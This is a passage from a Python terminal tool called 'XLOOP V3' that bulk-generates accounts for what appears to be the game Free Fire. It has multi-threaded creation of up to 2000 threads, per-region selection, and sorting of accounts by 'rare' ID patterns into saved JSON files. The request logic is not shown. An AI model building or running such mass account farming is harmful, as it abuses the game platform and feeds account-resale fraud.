        print(f"{GN}│{R}  {GN}◆{R} {GD}4{R} {DR}›{R} {WH}About{R}")
        print(f"{GN}│{R}  {GN}◆{R} {GD}0{R} {DR}›{R} {RD}Exit{R}")
        print(f"{GN}└{'─'*W}┘{R}")
        try:
            c = input(f"\n{LG}➜ {WH}Option : {R}").strip()
            if c == "1":
                HUNTER = False
                THRESH = 8
                gen_flow()
            elif c == "2":
                HUNTER = True
                THRESH = 12
                gen_flow()
            elif c == "3":
                view()
            elif c == "4":
                about()
            elif c == "0":
                exit_app()
            else:
                print(f"{RD}✗ Invalid{R}")
        except KeyboardInterrupt:
            exit_app()
        except Exception as e:
            print(f"{RD}✗ {e}{R}")

def gen_flow():
    global SUCCESS, RARE, COUPLE, START, EXIT_FLAG, HUNTER, THRESH
    EXIT_FLAG = False
    regions = [r for r in REGION_LANG.keys() if r != "BR"]
    
    clr()
    print(f"\n{GN}╔{'═'*W}╗{R}")
    print(f"{GN}║{R}  {LG}🌍 SELECT REGION{R}")
    print(f"{GN}╚{'═'*W}╝{R}")
    
    cols = 2
    line = f"{GN}│{R}"
    for i, r in enumerate(regions, 1):
        display = REGION_DISPLAY.get(r, r)
        line += f"  {LG}{i:2}{R} {WH}{display:<18}{R}"
        if i % cols == 0:
            print(f"{line} {GN}│{R}")
            line = f"{GN}│{R}"
    if line.strip() != f"{GN}│{R}":
        print(f"{line} {GN}│{R}")
    
    ghost_num = len(regions) + 1
    print(f"{GN}│{R}  {LG}{ghost_num:2}{R} {WH}GHOST - All Region{R}")
    print(f"{GN}├{'─'*W}┤{R}")
    print(f"{GN}│{R}  {LG}00{R} Back  |  {LG}000{R} Exit")
    print(f"{GN}└{'─'*W}┘{R}")
    
    region = None
    is_ghost = False
    
    while True:
        try:
            c = input(f"\n{LG}➜ {WH}Option : {R}").strip()
            if c == "00":
                return
            elif c == "000":
                exit_app()
            elif c.isdigit():
                n = int(c)
                if 1 <= n <= len(regions):
                    region = regions[n-1]
                    is_ghost = False
                    break
                elif n == len(regions) + 1:
                    region = "BR"
                    is_ghost = True
                    break
            else:
                print(f"{RD}✗ Invalid{R}")
        except KeyboardInterrupt:
            exit_app()
        except:
            pass
    
    if region is None:
        return
    
    clr()
    region_display = REGION_DISPLAY.get(region, region)
    print(f"\n{GN}╔{'═'*W}╗{R}")
    print(f"{GN}║{R}  {LG}📝 SETUP - {region_display}{R}")
    print(f"{GN}╚{'═'*W}╝{R}")
    
    try:
        acc_input = input(f"{GN}├{R}  {LG}Total{R} : {WH}").strip()
        if not acc_input.isdigit():
            print(f"{GN}✗ Must be number{R}")
            return
        total = int(acc_input)
        if total <= 0:
            print(f"{GN}✗ Must be > 0{R}")
            return
        
        name = input(f"{GN}├{R}  {LG}Name{R}   : {WH}").strip()
        if not name:
            print(f"{RD}✗ Cannot be empty{R}")
            return
        
        pw = input(f"{GN}├{R}  {LG}Pass{R}    : {WH}").strip()
        if not pw:
            print(f"{RD}✗ Cannot be empty{R}")
            return
        
        if not HUNTER:
            th = input(f"{GN}├{R}  {LG}Threshold{R}: {WH}").strip() or "8"
            THRESH = int(th) if th.isdigit() else 8
        
        threads = input(f"{GN}├{R}  {LG}Threads{R}  : {WH}").strip() or "200"
        tc = int(threads) if threads.isdigit() else 200
        if tc < 1:
            tc = 1
        if tc > 2000:
            tc = 2000
        
        print(f"{GN}└{'─'*W}┘{R}")
        
        SUCCESS = 0
        RARE = 0
        EPIC = 0
        MYTHIC = 0
        LEGENDARY = 0
        COUPLE = 0
        START = time.time()
        
        print(f"\n{GN}┌{'─'*W}┐{R}")
        print(f"{GN}│{R}  {LG} GENERATING{R} {WH}{total}{R} accounts in {WH}{region_display}{R}")
        print(f"{GN}└{'─'*W}┘{R}")
        print(f"{DR}  IDX    ACCOUNT_ID{R}")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=tc) as ex:
            futures = []
            max_workers = min(tc * 2, 100)
            for i in range(max_workers):
                futures.append(ex.submit(worker, region, name, pw, total, i+1, is_ghost))
            
            try:
                while SUCCESS < total and not EXIT_FLAG:
                    time.sleep(0.1)
                EXIT_FLAG = True
                for f in futures:
                    try:
                        f.cancel()
                    except:
                        pass
            except KeyboardInterrupt:
                EXIT_FLAG = True
        
        elapsed = time.time() - START
        
        print()
        box("📊 XLOOP SUMMARY", [
            f"{LG}Generated{R} {WH}{SUCCESS}{R}",
            f"{LB}RARE{R} {LB}{RARE}{R}",
            f"{YL}EPIC{R} {YL}{EPIC}{R}",
            f"{RD}MYTHIC{R} {RD}{MYTHIC}{R}",
            f"{LR}LEGENDARY{R} {LR}{LEGENDARY}{R}",
            f"{LP}COUPLE{R} {LP}{COUPLE}{R}",
            f"{LG}Time{R} {WH}{elapsed:.1f}s{R}",
            f"{LG}Speed{R} {WH}{SUCCESS/elapsed:.1f}/s{R}" if elapsed > 0 else f"{LG}Speed{R} {WH}0/s{R}"
        ])
        input(f"\n{LG}➜ {WH}Enter to continue{R}")
        
    except KeyboardInterrupt:
        exit_app()
    except Exception as e:
        print(f"{RD}✗ Error: {e}{R}")
        time.sleep(2)

def count_files_in_dir(folder_path):
    total = 0
    if os.path.exists(folder_path):
        for root, _, files in os.walk(folder_path):
            total += len([f for f in files if f.endswith(".json")])
    return total

def view():
    clr()
    print(f"\n{GN}╔{'═'*W}╗{R}")
    print(f"{GN}║{R}  {LG}📁 XLOOP SAVED{R}")
    print(f"{GN}╚{'═'*W}╝{R}")
    
    normal = 0
    for p in [ACC_FOLDER, GHOST_FOLDER]:
        if os.path.exists(p):
            for f in os.listdir(p):
                if f.endswith(".json"):
                    try:
                        with open(os.path.join(p, f), "r", encoding="utf-8") as fp:
                            data = json.load(fp)
                            if isinstance(data, list):
                                normal += len(data)
                    except:
                        pass

    c_leg = count_files_in_dir(LEG_FOLDER)
    c_myth = count_files_in_dir(MYTH_FOLDER)
    c_epic = count_files_in_dir(EPIC_FOLDER)
    c_rare = count_files_in_dir(RARE_FOLDER)

    couple = 0
    if os.path.exists(CPL_FOLDER):
        for f in os.listdir(CPL_FOLDER):
            if f.endswith(".json"):
                try:
                    with open(os.path.join(CPL_FOLDER, f), "r", encoding="utf-8") as fp:
                        data = json.load(fp)
                        if isinstance(data, list):
                            couple += len(data)
                except:
                    pass

    box("📊 ALL STATS", [
        f"{LR} LEGENDARY{R} {LR}{c_leg}{R}",
        f"{RD} MYTHIC   {R} {RD}{c_myth}{R}",
        f"{YL} EPIC     {R} {YL}{c_epic}{R}",
        f"{LB} RARE     {R} {LB}{c_rare}{R}",
        f"{LP} COUPLE   {R} {LP}{couple}{R}",
        f"{DR} NORMAL   {R} {WH}{normal}{R}"
    ])
    input(f"\n{LG}➜ {WH}Enter to continue{R}")


def about():
    clr()
    print(f"\n{GN}╔{'═'*W}╗{R}")
    print(f"{GN}║{R}  {LG}ℹ️ XLOOP V3{R}")
    print(f"{GN}╚{'═'*W}╝{R}")
    box("ABOUT XLOOP", [
        f"{LG}Name{R} {WH}XLOOP V3{R}",
        f"{LG}Platform{R} {WH}FF OB54{R}",
        f"{LG}Rarity{R} {LB} RARE - ID BIRU{R}",
        f"{LG}       {R} {YL} EPIC - ID KUNING{R}",
        f"{LG}       {R} {RD} MYTHIC - ID MERAH TUA{R}",
        f"{LG}       {R} {LR} LEGENDARY - ID MERAH MUDA{R}",
        f"{LG}Couple{R} {LP} PINK{R}",
        f"{LG}Speed{R} {WH}ULTRA{R}",
        f"{LG}🥀 {R} {WH}XLOOP{R}"
    ])
    input(f"\n{LG}➜ {WH}Enter to continue{R}")

def exit_app(signum=None, frame=None):
    global EXIT_FLAG
    EXIT_FLAG = True
    print(f"\n{LG}👋 Thanks for using!{R}")
    sys.exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, exit_app)
    signal.signal(signal.SIGTERM, exit_app)
    try:
        menu()
    except KeyboardInterrupt:
        exit_app()
    except Exception as e:
        print(f"{RD}Error: {e}{R}")
        time.sleep(3)
        sys.exit(1)